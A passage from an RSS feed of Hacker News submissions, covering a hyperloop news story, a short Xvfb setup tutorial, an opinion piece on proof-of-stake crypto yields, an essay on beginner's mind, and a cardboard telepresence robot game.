vision, its hyperloop system&nbsp;could move passengers or cargo between Calgary and Edmonton in about&nbsp;half an hour. The cost of a one-way ticket would range between $40 to $60, Gendron said.</p>  <p>To build the full line, however, would cost between $6 billion and $10 billion, he said.&nbsp;The company's goal&nbsp;is to attract private investment by showing that it's economically viable, Gendron added.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transpod-calgary-skyline.jpg 300w,https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transpod-calgary-skyline.jpg 460w,https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transpod-calgary-skyline.jpg 620w,https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transpod-calgary-skyline.jpg 780w,https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transpod-calgary-skyline.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4216746.1500667597!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transpod-calgary-skyline.jpg"></p></div><figcaption>An artist's rendering of the TransPod hyperloop against the Calgary skyline. <!-- --> <!-- -->(TransPod)</figcaption></figure></span></p>  <p>TransPod&nbsp;aims to demonstrate to large institutional investors that there's<em>&nbsp;</em>enough ridership for passengers, as well as goods.</p>  <p>"The second aspect is to do a really detailed cost analysis of the infrastructure," Gendron said.&nbsp;</p>  <p>"That will confirm the amount of investment we need to build the full line, which includes not only the infrastructure, but also the stations and the land acquisition."</p>    <p>Should things progress, TransPod&nbsp;would like to begin construction of a $500-million test track in Alberta in 2022. The final step would be to start construction of the full line, currently targeted to begin&nbsp;in&nbsp;2025.</p>  <p>The former NDP government had allocated 10 kilometres of land between Calgary and Edmonton to&nbsp;TransPod to build a test track. Gendron said they're looking at using the same area but would need to confirm once the feasibility study is complete.</p>  <p>Gendron said the company is also&nbsp;in the design and development phase for a testing facility in France.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/ric-mciver.jpg 300w,https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/ric-mciver.jpg 460w,https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/ric-mciver.jpg 620w,https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ric-mciver.jpg 780w,https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/ric-mciver.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5176459.1560541966!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/ric-mciver.jpg"></p></div><figcaption>Transportation Minister Ric McIver said he's hopeful that TransPod's work will lead to the development of new technology that's put into&nbsp;practice in Alberta, spurring further job creation. The company estimates the project would create 38,000 jobs over the next 10 years.<!-- --> <!-- -->(Mike Symington/CBC)</figcaption></figure></span></p>  <p>Unlike trains, hyperloop&nbsp;systems don't use rails. Instead, they propel&nbsp;vehicles through a vacuum&nbsp;in sealed tubes at high speeds&nbsp;made possible by the extremely low friction inside the tube.</p>  <p>Tesla founder&nbsp;Elon Musk first outlined his vision for the hyperloop concept in 2013. Since then, it's also attracted the attention of billionaire Richard Branson, founding chairman of&nbsp;<a href="https://www.reuters.com/article/us-virgin-spirit-aerosystm-hyperloop/floating-on-air-virgin-hyperloop-signs-deal-with-key-jet-parts-maker-idUSKBN23W1OJ">Virgin Hyperloop One</a>.</p>  <p>Virgin Hyperloop's goal is to launch commercial routes by 2029.</p>  <p>Transpod and Spain's Zeleros are also competing to&nbsp;upend traditional passenger and freight networks with&nbsp;technology they say will slash travel times and&nbsp;congestion.</p>  <p>The discussion around&nbsp;hyperloop technology&nbsp;has been received with both excitement and&nbsp;skepticism over the years.</p>  <p>A Boeing executive last year rejected the suggestion&nbsp;hyperloop travel&nbsp;<a href="https://www.cnbc.com/2019/11/18/hyperloop-to-threaten-aviation-not-in-my-lifetime-says-boeing-exec.html">could threaten aviation within his lifetime</a>. The&nbsp;cost, complexity, regulation and safety of hyperloop&nbsp;systems have also been identified as challenges.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/calgary/transpod-alberta-hyperloop-mou-1.5697848</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278095</guid>
            <pubDate>Wed, 26 Aug 2020 01:23:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running X Client Using Virtual X Server Xvfb]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24278084">thread link</a>) | @keyboardman
<br/>
August 25, 2020 | https://leimao.github.io/blog/Running-X-Client-Using-Virtual-X-Server-Xvfb/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Running-X-Client-Using-Virtual-X-Server-Xvfb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">
  <div>
    
	<p><img src="https://leimao.github.io/images//author_images/Lei-Bio-Medium.jpg" alt="Lei Mao bio photo"></p><h3>Lei Mao</h3>
<p>Machine Learning, Artificial Intelligence, Computer Science.</p>
<p>

<a href="http://facebook.com/dukeleimao" target="_blank"><i></i> Facebook</a>
<a href="http://linkedin.com/in/lei-mao" target="_blank"><i></i> LinkedIn</a>


<a href="http://github.com/leimao" target="_blank"><i></i> GitHub</a>
<a href="http://scholar.google.com/citations?user=R2VUf7YAAAAJ" target="_blank"><i></i>&nbsp; G. Scholar</a>






<a href="mailto:dukeleimao@gmail.com" target="_blank"><i></i> E-Mail</a>

<a href="https://leimao.github.io/feed.xml" target="_blank"> RSS</a>
  </p></div>
  <article>
    <!--/ .headline-wrap -->
    <div>
      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I run some programs, which normally run on a local computer with a graphical display, in Docker container, they would somehow fail. Sometimes, I need to run many simulations that have GUIs simultaneously, and I don’t want to see those GUIs at all. Is there any virtual display which allows me to put the graphics into? The answer is yes and we could use X virtual framebuffer, Xvfb.</p>



<p>In this blog post, I would like to take you to glimpse the X server-client architecture for displaying graphics, and discuss how to use Xvfb.</p>

<h3 id="x-server-client">X Server-Client</h3>

<p>In computing, the X Window System, commonly known as X11 or X, is a network-transparent windowing system for bitmap displays. X uses a client-server model. An X server program runs on a computer with a graphical display and communicates with various client programs.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-07-01-Running-X-Client-Using-Virtual-X-Server-Xvfb/2000px-X_client_server_example.svg.png">
    <figcaption>X Server-Client Architecture</figcaption>
</figure>
</div>

<p>Any application that requires GUI and interacts with X server program is called X client. X client typically includes applications such as OS GUI, web browser, most of the games, and so on. Without X server, some of those programs would fail to run.</p>



<p>X server requires a graphical display. Without a graphical display, X server will not start and thus all the X clients that must run on a X server would fail.</p>



<p>In some scenarios where X server is not started or there is no display, we would still like to run X clients, we should use a virtual X server to host the X clients. Instead of outputting signals to screen, the virtual X server outputs signals to memory. This will be very useful for running programs, especially those whose display graphics are not important, in Docker container or on remote servers. For example, if you would like to watch a live streaming on a remote server without graphical display and take some snapshots routinely every 5 minutes, virtual X server will be very helpful. In fact, some libraries, such as Matplotlib (without using agg backend) and TikZ requires to be hosted on X server. If there is no display, say in a Docker container, running the programs that use those libraries will fail.</p>

<h3 id="x-virtual-framebuffer-xvfb">X Virtual Framebuffer (Xvfb)</h3>

<p>Xvfb or X virtual framebuffer is a display server implementing the X11 display server protocol. In contrast to other display servers, Xvfb performs all graphical operations in virtual memory without showing any screen output.</p>



<p>To install Xvfb, please run the following commands in the terminal.</p>

<div><div><pre><code><span>$ </span><span>sudo </span>apt update
<span>$ </span><span>sudo </span>apt <span>install </span>xvfb ghostscript
</code></pre></div></div>



<p>Once the <code>xvfb</code> and <code>ghostscript</code> are installed, we could start any X client in the terminal using <code>xvfb-run</code>.</p>

<div><div><pre><code><span>$ </span>xvfb-run firefox
<span>$ </span>xvfb-run python plot.py
</code></pre></div></div>

<h3 id="conclusions">Conclusions</h3>

<p>Xvfb would be very useful for a lot of GUI based simulations running in Docker container or remote server.</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Xvfb">Wikipedia - Xvfb</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Xvfb">Wikipedia - X Window System Protocols and Architecture</a></li>
  <li><a href="http://manpages.ubuntu.com/manpages/trusty/man1/xvfb-run.1.html">xvfb-run</a></li>
</ul>

      <hr>
      
    </div><!-- /.article-wrap -->
  
    <!-- /#disqus_thread -->
  
  </article>
</div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Running-X-Client-Using-Virtual-X-Server-Xvfb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24278084</guid>
            <pubDate>Wed, 26 Aug 2020 01:21:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The catalyst for the next speculative crypto bubble]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24277841">thread link</a>) | @simplertms
<br/>
August 25, 2020 | https://4thquadrant.io/freearticles/the-catalyst-for-the-next-speculative-crypto-bubble/ | <a href="https://web.archive.org/web/*/https://4thquadrant.io/freearticles/the-catalyst-for-the-next-speculative-crypto-bubble/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_28_1fb">

<div>
<p>In 2017/18 cryptocurrencies went through a speculative bubble that saw its flagship currency Bitcoin reach peaks of $20,089 and a market cap of $320 billion. At the height of euphoria, the total market cap of all cryptocurrencies reached $790 billion. While Bitcoin and other cryptocurrencies (known as altcoins) have been around since 2009, it was the consolidation of mindshare and public interest in 2017 and 2018 that has made it a mainstay for alternative investors. But the fact remains that we are yet to see the adoption event that will make it a mainstay for all investors.</p>



<p>Most recently Cryptocurrencies have once again found a place in the news cycle following two years of dormancy post the bubble. The central trend appears to be around the phenomenon of decentralised finance otherwise known as DeFi. The quantity of activity and community participation in DeFi and related activities have been pointed to as potential indicators of a return to the speculative mania that took place in 2017. By the end of July, the total value locked up in DeFi related projects was $4 billion. A somewhat marginal amount given that Bitcoin is now over $200 billion in valuation and the whole market for cryptocurrencies is approaching $350 billion.</p>



<p>Regardless, DeFi represents a strong use case for cryptocurrencies as a means to provide lending and borrowing capabilities and is also geared to attract significant speculative interest. One of the most basic and pervasively engaged features of DeFi at present is yield farming. Cryptocurrency assets can earn or ‘farm’ yields in three main forms:</p>



<ol><li>Participating in financial products as one would in traditional markets</li><li>Locking up some cryptocurrency liquidity in return for an interest-like reward.</li><li>Staking cryptocurrency (like collateral) to fortify the security of a Proof-of-Stake based blockchain platform, where ‘staking’ some tokens prevents malicious activity similar to how a collateralized loan prevents default risk.</li></ol>



<p>However, the attention decentralised finance (DeFi) is getting right now, looks more like a bubble than a catalyst for adoption, where volatility (price, scams, hacks etc) of the industry hasn’t been solved.</p>



<p>The question then is, what is a catalyst for adoption? Given that financial products (form 1) on any platforms, blockchain or otherwise, can provide yields through participation, let us focus on yield farming native to the nature of blockchain (forms 2 &amp; 3), Proof-of-Stake – where providing security/liquidity returns yields.</p>



<p>Proof-of-Stake is simply the mechanism whereby a decentralised platform is able to provide security against attacks on the immutability of the ledger on the blockchain. The name holds the key to understanding this mechanism where ‘staking’ (locking up) the currency on the platform, is the means by which you are able to validate transactions on the ledger (the state of the blockchain) and add to the ledger. The game theory of securing the chain via staking is tied to rewards for being a good actor and penalties for being a bad actor. These rewards represent the yields earned for securing the chain.</p>



<p>What is particularly interesting as the speculation starts to ramp up once more is that Proof-of-Stake based platforms are gaining more attention because of their ability to provide yields in return for a financial stake in the platform. Yields on a Proof-of-Stake network represents a passive income avenue for a spectrum of individual/retail investors all the way to institutional players. This differs from the Proof-of-Work mechanism, most popularly represented by Bitcoin, which consumes electricity (mining) to secure the ledger. Where mining BTC is more difficult and less accessible to the spectrum of investors (currently there are a few large mining farms that make this their primary occupation) most BTC investors will make capital gain returns based on price appreciation through adoption. In the absence of BTC becoming a true global currency it will depend on a series of consolidating speculative bubbles to edge toward adoption – a chicken and egg problem perhaps sped along by the more consistent rewards associated with Proof-of-Stake.</p>



<h3>Yields: A Ponzi scheme or a catalyst for cryptocurrency adoption?</h3>



<p>Thus far the speculation on the future potential of blockchain technology, and cryptocurrencies by extension, is what gives the industry the large valuation it holds, even as use cases seem scarce or utilised by few.</p>



<p>In such a case, providing yields for no inherent value due to lack of use case, appears more like a Ponzi scheme than investment in a nascent technology. The idea is that when more people take a financial stake in the platform and lock up those funds for yields, all the prior participants will continue to benefit, not only from the yields but also from the price appreciation of the currency and market capitalisation of the platform. Of course, the integrity of the platform will only be realised when the use cases are actualised at some point in the future. In the interim, the Ponzi characteristics are exacerbated by the lucrative yield returns (often ranging from 5-20% per annum) made available by Proof-of-Stake networks, in comparison to traditionally available yield/interest earning financial products. It’s important to note that platforms vary in risk and reliability, we can liken it to investing in financial products across different tranches – some more junk-like than others.</p>



<p>Bitcoin, on the other hand, provides an entirely different avenue of investment in blockchain but comes with its own set of challenges – namely the chicken and egg problem we discussed above. Bitcoin requires the expense of electricity through mining activities to secure the network and ‘earn’ Bitcoin. While the rewards for mining on a Proof-of-Work network can be equated to the yields earned for staking on a Proof-of-Stake network, the ‘work’ performed for Proof-of-Work (cost of time and initial investment) makes it impossible for it to operate like a Ponzi scheme. Essentially, this means that Bitcoin can’t propagate its adoption through the mechanism of mining, where mining does not lend itself to the low-effort traits of Proof-of-Stake currently attracting attention to the DeFi bubble.</p>



<p>The lower effort in work required to secure the Proof-of-Stake network allows more users to participate meaningfully and earn yields. This is the beginning of a solution to the chicken and egg problem, where increased participation can bolster the market capitalisation required for widespread traction. In summary, easier participation increases the likelihood of network effect for a platform, where earning yields becomes the initial use case for the platform – as risky or unreliable as it may seem. Increased traction over time is very capable of evolving the volatile and Ponzi-like DeFi space into a mature financial structure supporting the blockchain ecosystem.</p>



<p>During 2017/18 the prevailing narrative of Proof-of-Work and crypto’s use case as a currency was not substantiated and resulted in a bubble rather than an adoption event. While it gained attention on the global stage, the widely held perception was that there was no immediately apparent use case that could sustain and grow its valuation beyond pure speculation. In the last couple of years following the bust of the speculative bubble, Proof-of-Stake has become a more significant narrative for the industry. The most marked indicator being Ethereum (currently Proof-of-Work), the second largest cryptocurrency, indicating its intent to transition to a Proof-of-Stake network.</p>



<p>The narrative of Proof-of-Stake is ballooning out quite rapidly, popularly considered to be propagated by the perceived benefits for scaling transaction capacity. However, what we have identified is that the use case of earning yields has the potential to catalyse the next boom cycle similar to 2017/ 18, and perhaps even to a greater extent. Even in the absence of yields as a catalyst for the next boom cycle, it represents a solid use case as a financial ecosystem to sustain speculative value and drive cryptocurrencies closer to mainstream use.</p>



<div id="slimcalltoaction"><p>This is box title</p><p>If you enjoyed this article, take advantage of our 14 days free trial to explore our exclusive content. Or sign-up for our free weekly newsletters. View our subscription options <a href="https://4thquadrant.io/subscribe">here.</a></p></div>
</div></div><div data-td-block-uid="tdi_29_cf2">

<div><h3><span>CONTACT THE EDITOR</span></h3>
<p>We welcome thoughtful discourse on all our content. If you would like to further explore or discuss any of the ideas covered in this article please contact our editors directly.<br><span>Contact Details</span></p>
</div></div></div>]]>
            </description>
            <link>https://4thquadrant.io/freearticles/the-catalyst-for-the-next-speculative-crypto-bubble/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277841</guid>
            <pubDate>Wed, 26 Aug 2020 00:31:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Embrace Beginner's Mind; Avoid the Wrong Way to Be an Expert]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24277832">thread link</a>) | @7d7n
<br/>
August 25, 2020 | https://eugeneyan.com/writing/beginners-mind/ | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/beginners-mind/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>When we learn something new, such as a programming language, we start as beginners. We can learn and follow the rules and apply them in a narrow context. However, we don’t understand the bigger picture and get lost outside of that specific context.</p>

<p>Imagine that I enroll in a <a href="https://en.wikipedia.org/wiki/Massive_open_online_course" target="_blank">MOOC</a> on <code>R</code> and learn about statistical analysis, machine learning, and <a href="https://rstudio.github.io/shinydashboard/" target="_blank"><code>Shiny</code></a> dashboards. As part of machine learning, I learn that I should <a href="https://www.rdocumentation.org/packages/caret/versions/6.0-86/topics/createDataPartition" target="_blank">split the data into train and test</a> sets. I apply this in assignments and Kaggle and everything works fine—this is the <em>narrow</em> context.</p>

<p>Then, perhaps I get the opportunity to apply my new skills in a <em>wider</em> context—I build a model, validate it (via random train-test split), and deploy it. However, the offline and online (i.e., A/B test) metrics don’t match up. Eventually, I figure out that I should use a <a href="https://www.fast.ai/2017/11/13/validation-sets/" target="_blank">time-based split</a> so future data doesn’t <em>leak</em> into the training set.</p>

<p>With the benefit of the wider context, I encountered challenges and failures (read: lessons) that were not part of the MOOC assignments. As a result, I got to see the bigger picture; I know there’s still lots to learn. Thus, I continue to learn and progress through the stages of beginner, intermediate, and so on.</p>

<blockquote>
  <p>The more I learn, the more I realise how much I don’t know. – Albert Einstein</p>
</blockquote>

<h2 id="from-beginner-to--expert-beginner">From beginner to … expert beginner</h2>

<p>But what happens if I <em>don’t</em> see the bigger picture?</p>

<p>Let’s assume I work in the HR department of a widget manufacturer. Everything—from headcount to payroll to vacation balance—is run in Excel. I apply my newfound <code>R</code> skills to automate my work via one-off scripts. This involves calculating statistics on factory sites and displaying it via a <code>Shiny</code> dashboard on the department desktop. In the eyes of my manager and team, I’m an absolute rockstar ninja wizard. I get showered with praise and am promoted to manager of HR data science.</p>

<p>I might not know about proper ML validation, deployment, unit tests, or even version control. I certainly haven’t done any of that. But who cares? We don’t need it. I’m now the manager of HR data science. I’m now… an “expert”.</p>

<p>To those in the know, I’m clearly still a beginner. But my context is narrow and I don’t see the bigger picture. Thus, I don’t know that there’s still lots to learn, lots to do. However, because I’ve achieved a modicum of success (through <em>narrow</em> applications of what I learned) and others call me an expert, I now view myself as an expert. As a result, I stop learning. I’m now stuck at a local optima. <strong>I’ve become an <a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/" target="_blank">expert beginner</a></strong>.</p>

<p>Suppose I stay in that same role, within HR, for 10 years. At the end of it, do I have 10 years of experience, or one year of experience repeated 10 times?</p>

<details><summary>An army of expert beginners led by an expert beginner</summary>
<div>

<p>As head of HR data science, I hire a team of data scientists. Eventually, some team members will suggest new technology (e.g., Python, Docker) or practices (e.g., version control, unit testing).</p>

<p>However, I’m the most experienced (read: longest tenure) and the expert-est expert. I dismiss ideas and technology that I’m unfamiliar with. “Oh, I see you’re new here. Yes, Python sounds like a good idea but the Chief HR Officer really likes the <code><span>Shiny</span></code> dashboard that I built.” “Haha, we don’t need unit tests! I live and breathe this code every day—there’s no need to test it”.</p>

<p>Team members who can see the bigger picture are disappointed by the outdated technology and incorrect practices. They see no room for learning and growth. As a result, <strong>the most talented and ambitious leave</strong> (if they know what’s best for them). For those who stay—hurray! There’s less competition. They’ll toe the line and one day, they’ll be a <em>senior</em> expert beginner and teach new joiners their “expert” ways.</p>

<p>This leads to the <a href="http://brucefwebster.com/2008/04/11/the-wetware-crisis-the-dead-sea-effect/" target="_blank">Dead Sea effect</a> where you’re <strong>left with your least talented and effective</strong> people. They’re grateful to have a job and settle in for a couple of years (or decades). Now, the team has (d)evolved into an army of expert beginners who follow the directions of the top expert beginner.</p>

<p><img src="https://eugeneyan.com/assets/dead-sea.jpg" title="The expert beginners are entrenched and can’t be replace" alt="The expert beginners are entrenched and can’t be replace"></p>
<p>The expert beginners are entrenched and can’t be replaced (source: <a href="https://eugeneyan.com/writing/beginners-mind/(https://dilbert.com/strip/2010-12-02)">Scott Adams</a>)</p>

<p>Because expert beginners have learned “everything” there is to learn, tried “everything” there is to try, and done “everything” there is to do, there’s nothing new to learn, try, and do. The team stops trying new ideas—“Oh we don’t use Docker here. We have VMs!”—and the organization stops innovating.</p>

<p>This partly explains some industries getting disrupted. The iPhone disrupting Nokias and Blackberrys, AWS disrupting on-premise hardware, Stripe disrupting payment processing, Tesla disrupting… you get the idea.</p>

</div>
</details>

<p><img src="https://eugeneyan.com/assets/climbed-it-all.jpg" title="The expert beginner doesn't see the bigger picture and is thus stuck" alt="The expert beginner doesn't see the bigger picture and is thus stuck"></p>
<p>The expert beginner doesn't see the bigger picture; thus, he is stuck.</p>

<h2 id="the-beginners-mind-is-always-a-student">The beginner’s mind is always a student</h2>

<p>How do we prevent stagnation (and possibly becoming an expert beginner)? How do we stay open-minded and constantly learning and experimenting?</p>

<p><strong>One way is <a href="https://en.wikipedia.org/wiki/Shoshin" target="_blank">Shoshin</a> (beginner’s mind)</strong>. It’s a concept from Zen Buddhism on having an attitude of openness, eagerness, and no preconceptions, even when our knowledge of the subject is advanced. In other words, to think <em>just</em> like a beginner.</p>

<blockquote>
  <p>In the beginner’s mind there are many possibilities, but in the expert’s there are few. – Shunryu Suzuki</p>
</blockquote>

<p>With beginner’s mind, regardless of your experience and expertise, you <strong>stay curious and approach new ideas and experiences as a student</strong>. Even when new technology or methods don’t fit your paradigm, you’re open to learning and trying it. Students don’t say “That’s not how we do things here”.</p>

<p>Sometimes, when others view us as experts, we let it get to us. We stay within our narrow subject matter expertise and stop exploring new ideas and possibilities. We avoid newer, bigger challenges so we don’t make mistakes; we stick to what has worked in the past. This helps preserve our expert identity.</p>

<blockquote>
  <p>The most dangerous phrase in the language is, “We’ve always done it this way.” – Grace Hopper</p>
</blockquote>

<p>But this doesn’t make sense. In my field of data science, new tools (e.g., Spark, Docker, Airflow) and methods (e.g., embeddings, attention, pre-training) constantly improve on the state of the art (SOTA)—it’s useful, if not essential, to keep up to date. (That said, fundamental techniques like regression and decision trees are often a solid baseline.)</p>

<h2 id="the-beginners-mind-keeps-on-pedalling">The beginner’s mind keeps on pedalling</h2>

<p>Learning is like cycling. When we start pedalling (from a standstill), it takes effort and time to gain momentum. Nonetheless, we’ll pick up speed and begin gaining distance.</p>

<p>We might look back at where we started and think “Wow, I’ve come a long way. Perhaps I don’t have to pedal as hard; perhaps I don’t have to pedal at all.” If we stop pedalling, the initial momentum might carry us slightly further, but eventually, we’ll come to a standstill. While we don’t lose the distance covered, we’re not gaining distance either. (Though in fast-paced fields like tech, if you don’t move forward, <em>you begin to move backward</em>.)</p>

<p>Here, distance is knowledge (and achievements); momentum is learning. While distance is correlated with expertise, the relationship is not as strong as we think (e.g., one year of experience repeated 10 times). I think momentum (the ability to learn and adapt quickly) is part of expertise as well. The experts I know are often reading or hacking. At work, they can synthesize their mental prototypes and tailor solutions based on context.</p>

<p>To maintain momentum, <strong>the beginner’s mind continues to pedal regardless of the distance they’ve covered</strong>. It’s not surprising that many successful people are—and continue to be—voracious readers and learners. Warren Buffet, Bill Gates, Elon Musk, just to name a few. Do you know any successful person that doesn’t read or learn?</p>

<blockquote>
  <p>The illiterate of the 21st century will not be those who cannot read and write, but those who cannot learn, unlearn, and relearn. – Alvin Toffler</p>
</blockquote>

<details><summary>Note: Not all knowledge is the same</summary>
<div>

<p>There’s knowledge that we gain from books and courses—we’re tested on this in exams. Then, there’s <a href="https://commoncog.com/blog/the-tacit-knowledge-series/" target="_blank">(tacit) knowledge</a> that we gain from practice—we’re tested on this in life.</p>

<div>

<blockquote><div lang="en" dir="ltr"><p>You cannot get educated by this self-propagating system in which people study to pass exams, and teach others to pass exams, but nobody knows anything.</p><p>You learn something by doing it yourself, by asking questions, by thinking, and by experimenting. 🧠</p></div>— Richard Feynman (@ProfFeynman) <a href="https://twitter.com/ProfFeynman/status/1295411496407556096?ref_src=twsrc%5Etfw">August 17, 2020</a></blockquote>

</div>

<p>For example, learning to ride a bicycle. We can’t learn to ride a bike by reading a textbook. The <strong>only way to learn is by actually doing it</strong>. We’re going to lose balance and fall, but eventually, we’ll figure it out. Also, our ability to ride a bike is <strong>transferable</strong> to other two-wheeled transport. Once we learn how to ride a regular bike, we’ll have a gentler learning curve on mountains bikes, tandem bikes, and even e-scooters.</p>

<p>Similarly, some skills and knowledge <strong>can only be gained through practice</strong>. They’re usually <strong>transferable</strong> across multiple domains too. For example, what’s the most suitable way to <a href="https://bugra.github.io/posts/2020/5/25/how-to-serve-model/" target="_blank">serve models in production</a>? There are some common patterns: compute offline and cache, serve via microservice, embed in the main app. Do these patterns differ across domains? Not much. Which is the best approach for our use case? Well, it depends—knowing the answer is tacit knowledge.</p>



<p>Often, such skills and knowledge are <strong>fundamental</strong> and can be thought of as building blocks (or <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a>). For example, in programming, we learn about conditionals, iteration, and data structures. In distributed data processing, we learn about map, reduce, and shuffle. Once we understand these fundamentals, it’s easier to pick up another programming language or distributed processing framework. It also helps us write more effective software and <a href="https://en.wikipedia.org/wiki/Extract,_transform,_load" target="_blank">ETL</a> jobs.</p>

<p>Mastering the fundamentals also helps with the <a href="https://commoncog.com/blog/to-get-good-go-after-the-metagame/" target="_blank">metagame</a>. The meta (i.e., higher-order factors) changes constantly. For example, <a href="https://eugeneyan.com/writing/nlp-supervised-learning-survey/" target="_blank">natural language processing</a> has evolved rapidly from recurrent models to embeddings to attention to …</p></div></details></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://eugeneyan.com/writing/beginners-mind/">https://eugeneyan.com/writing/beginners-mind/</a></em></p>]]>
            </description>
            <link>https://eugeneyan.com/writing/beginners-mind/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277832</guid>
            <pubDate>Wed, 26 Aug 2020 00:28:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cardboard Wolfenstein 3D Telepresence Game]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24277779">thread link</a>) | @ruined
<br/>
August 25, 2020 | https://thecraftyrobot.net/blogs/projects/cardboard-wolfenstein-3d-telepresence-robot-fp-nazi-punch-game | <a href="https://web.archive.org/web/*/https://thecraftyrobot.net/blogs/projects/cardboard-wolfenstein-3d-telepresence-robot-fp-nazi-punch-game">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
<p><span>﻿<iframe width="560" height="315" src="https://www.youtube.com/embed/tjIRY2DMgMI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></span></p>
<p>Drive a little robot around an actual cardboard&nbsp;Wolfenstein labyrinth and punch cardboard Nazis.</p>
<p><img alt="Looping video of a small robot with a smartphone with a mans face moving around a cardboard labyrinth punching cardboard Nazis " src="https://cdn.shopify.com/s/files/1/1041/4014/files/RossRampageGIF2_1024x1024.gif?v=1598349667"></p>
<p>You can play Smartistein3D during the hours listed below, in your browser at <a href="https://thecraftyrobot.github.io/smartistein3D/pilot.html?botName=sxblgrdtqnw" target="_blank" title="Smartistein3D" rel="noopener noreferrer">this link</a>. You can control the robot using either the buttons on the screen or arrow keys and space bar.</p>
<p>Tue Aug 25: 11:30 to 18:30 BST</p>
<p>Wed Aug 26: 9:30 to 18:30 BST</p>
<p>Wed Sep 2: 9:30 to 18:30 BST</p>
<p>Thur Sep 3:&nbsp;9:30 to 18:30 BST</p>
<p><img alt="Looping video showing the the robot's perspective as it drives up and punches a cardboard Nazi" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchFPV2_1024x1024.gif?v=1598398833"></p>
<h2>Play a first person game with a robot</h2>
<p><img alt="Looping video of a cardboard robot carrying a smartphone with a man's face on it moving from side to side" src="https://cdn.shopify.com/s/files/1/1041/4014/files/Wiggle1_1024x1024.gif?v=1598350839"></p>
<p>We've created a new expansion for <a href="https://thecraftyrobot.net/" title="Meet Smartibot">Smaribot</a> that allows you to build a telepresence robot that works with your phone. It's called <a href="https://www.kickstarter.com/projects/rossatkin/smartipresence-cardboard-telepresence-robot" target="_blank" title="Smartipresence on Kickstarter" rel="noopener noreferrer">Smartipresence</a> and&nbsp;to make it all work slickly&nbsp;we've built a telepresence system.</p>
<p><img alt="Looping video. First section shows a cardboard robot carrying a smartphone driving towards a small child. Second section shows the robot's point of view with buttons at the side moving it." src="https://cdn.shopify.com/s/files/1/1041/4014/files/ChasingChild5_1024x1024.gif?v=1598350981"></p>
<p>Driving the robot around from somewhere else feels a bit like playing a first person game and made me wonder what it would be like to build an actual game around it.</p>
<p>It felt appropriate to&nbsp;go back to the&nbsp;origin of the first person shooter genre and do Wolfenstein 3D. I think many of us miss the chunky pixels and moral clarity that Nazis are bad.&nbsp;</p>
<h2>Cardboard computer game</h2>
<p><img alt="Loping video of a small robot punching a cardboard Nazi in a cardboard labrynth" src="https://cdn.shopify.com/s/files/1/1041/4014/files/PunchGif2_1024x1024.gif?v=1598351095"></p>
<p>Because&nbsp;Wolfenstein 3D had 2D sprites (enemy characters) in a 3D world I thought it would probably transfer to cardboard quite nicely. I wanted to build it all on a table which limited space a bit, meaning I wasn't going to build a robot that could shoot (probably a good decision anyway) so I settled on a compact cardboard labyrinth and a robot that could punch.</p>
<h2>Punching robot</h2>
